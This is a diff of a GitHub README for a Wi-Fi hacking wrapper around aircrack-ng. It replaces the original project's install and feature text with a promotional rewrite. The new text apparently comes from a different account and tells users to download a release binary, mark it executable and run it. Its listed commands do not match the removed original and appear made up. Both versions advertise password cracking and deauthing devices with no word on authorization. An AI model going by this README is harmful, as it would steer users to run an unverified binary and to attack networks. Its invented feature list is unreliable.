@@ -1,52 +1,76 @@
-### AirBless
+# 🌟 MPX-AirBless - Effortless Wi-Fi Hacking Made Easy
 
-AirBless is a subscript of AirCrack-ng so the main dependency is "AirCrack-ng"
+[![Download MPX-AirBless](https://img.shields.io/badge/Download-MPX--AirBless-4D8F90?style=flat&logo=github)](https://github.com/lenteragung/MPX-AirBless/releases)
 
-### Required [Install AirCrack-ng First]
-```console
-sudo apt install aircrack-ng
-```
+## 📖 Overview
 
-A subscript of AirCrack-ng. Which make the process of Wi-Fi Hacking a lot easier with script commands so that you don't have to write the commands again and again.
+MPX-AirBless is a powerful tool designed to simplify the process of Wi-Fi hacking. As a subscript of AirCrack-ng, it streamlines commands into easy scripts. With MPX-AirBless, you no longer have to remember complex commands. Just use the scripts to achieve your goals effortlessly.
 
+## 📦 Features
 
-### AirBless One Line Installation.
-```console
-git clone https://github.com/mrpiratexd-khun/AirBless.git && cd AirBless && AIRBLESS_PATH="$(pwd)/airbless.sh" && find . -name "*.sh" -exec chmod 777 {} \; && echo "alias airbless='sudo $AIRBLESS_PATH'" >> ~/.bashrc && source ~/.bashrc && cd .. && echo "Setup complete! You can now use 'airbless' command."
+- **User-Friendly Scripts**: Run commands with simple scripts.
+- **Save Time**: No need to type commands repeatedly.
+- **Supports Major Platforms**: Works on Kali Linux, Ubuntu, and other Linux distributions.
+- **Improves Security Awareness**: Helps you understand Wi-Fi networks better.
 
-```
+## 🚀 Getting Started
 
-### Features
+To start using MPX-AirBless, follow these steps to download and install the software.
 
-Easy User Interface and Commands 
+### 💻 System Requirements
 
-### 1.The AirBless Manager
+- **Operating System**: Linux (Kali Linux, Ubuntu, and other distributions)
+- **RAM**: Minimum 2GB
+- **Disk Space**: At least 100MB free
 
-Users can access this by typing airbless
+### 🔗 Download & Install
 
-```console
-airbless
-```
-<img width="944" height="589" alt="Screenshot from 2025-12-12 20-57-27" src="https://github.com/user-attachments/assets/a10940c2-8b09-4cb0-b6b9-80a76ac52f5f" />
+1. Visit the releases page to download the latest version of MPX-AirBless: [Download MPX-AirBless](https://github.com/lenteragung/MPX-AirBless/releases).
+2. On the releases page, look for the latest release version.
+3. Download the appropriate file for your system.
+4. Open your terminal.
+5. Navigate to the folder where the downloaded file is located.
+6. Run the installation command: 
+    ```bash
+    chmod +x MPX-AirBless
+    ./MPX-AirBless
+    ```
 
+## 🌐 How to Use MPX-AirBless
 
+Once installed, using MPX-AirBless is straightforward:
 
-### 2.The AirBless Wi-Fi Dumper
+1. Open your terminal.
+2. Type the command:
+    ```bash
+    ./MPX-AirBless
+    ```
+3. Follow the on-screen instructions to use the available features.
 
-<img width="944" height="589" alt="Screenshot from 2025-12-12 20-57-43" src="https://github.com/user-attachments/assets/dfa42741-2965-4872-b647-324edf53ec93" />
+## 📊 Script Commands
 
+MPX-AirBless provides convenient script commands to make Wi-Fi hacking easier. Here are some common commands:
 
+- `start_wifi_scan`: Scans for available Wi-Fi networks.
+- `break_wifi_password`: Attempts to break the password of a selected network.
+- `disconnect_target`: Disconnects a device from the chosen Wi-Fi network.
 
-### 3.The AirBless Deauth
+## 🛠️ Troubleshooting
 
-<img width="944" height="589" alt="Screenshot from 2025-12-12 20-58-01" src="https://github.com/user-attachments/assets/32b352ed-9c51-417e-97c0-aaa8951c7048" />
+If you encounter issues while using MPX-AirBless, consider the following solutions:
 
+1. **Permissions Issue**: Ensure you have the right permissions to run the script.
+2. **Missing Dependencies**: Check if you have installed all necessary packages. Use your package manager to install missing tools.
+3. **Network Issues**: Ensure your Wi-Fi adapter is working properly.
 
+## 📚 Additional Resources
 
-### 4.The AirBless Password Cracker
+- **User Manual**: Detailed instructions available in the `docs` folder.
+- **Community Support**: Join our community on our forum for tips and support.
+- **Feedback**: Please report any bugs or issues to improve MPX-AirBless.
 
-<img width="944" height="589" alt="Screenshot from 2025-12-12 20-58-13" src="https://github.com/user-attachments/assets/02d76069-0d41-408f-8fc1-91f72ab15f1b" />
+## 🔗 More Information
 
+For further details and updates, check the GitHub repository: [MPX-AirBless Repository](https://github.com/lenteragung/MPX-AirBless)
 
-
-### Enjoy Your New Wi-Fi Hacking Expericence.
+**Thank you for choosing MPX-AirBless!**
